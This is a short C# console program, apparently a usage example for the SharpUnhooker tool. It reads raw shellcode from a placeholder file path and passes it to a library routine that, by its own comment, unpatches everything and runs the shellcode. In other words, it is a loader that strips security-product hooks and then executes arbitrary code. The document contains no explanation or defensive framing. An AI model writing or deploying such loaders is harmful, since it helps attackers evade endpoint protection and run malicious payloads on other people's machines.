using SharpUnhooker;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SharpUnhookerExe
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // Get shellcode
            var code = File.ReadAllBytes(@"C:\path\to\shellcode\code.bin");

            // Unpatch everything and run shellcode.
            SUUsageExample.UsageExample(code);
        }
    }
}
